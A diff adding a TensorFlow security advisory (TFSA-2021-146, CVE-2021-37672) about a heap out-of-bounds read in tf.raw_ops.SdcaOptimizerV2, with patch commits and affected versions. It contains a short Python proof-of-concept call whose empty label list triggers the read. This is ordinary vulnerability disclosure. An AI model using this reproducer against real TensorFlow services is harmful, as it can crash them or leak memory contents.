@@ -1,0 +1,44 @@
+<h2>TFSA-2021-146: Heap OOB in <code>SdcaOptimizerV2</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37672</p>
+<h3>Impact</h3>
+<p>An attacker can read from outside of bounds of heap allocated data by sending
+specially crafted illegal arguments to <code>tf.raw_ops.SdcaOptimizerV2</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.SdcaOptimizerV2(
+  sparse_example_indices=[[1]],
+  sparse_feature_indices=[[1]],
+  sparse_feature_values=[[1.0,2.0]],
+  dense_features=[[1.0]],
+  example_weights=[1.0],
+  example_labels=[],
+  sparse_indices=[1],
+  sparse_weights=[1.0],
+  dense_weights=[[1.0]],
+  example_state_data=[[100.0,100.0,100.0,100.0]],
+  loss_type='logistic_loss',
+  l1=100.0,
+  l2=100.0,
+  num_loss_partitions=1,
+  num_inner_iterations=1,
+  adaptive=True)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353">implementation</a>
+does not check that the length of <code>example_labels</code> is the same as the number of
+examples.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6">a4e138660270e7599793fa438cd7b2fc2ce215a6</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by members of the Aivul Team from Qihoo
+360.</p>
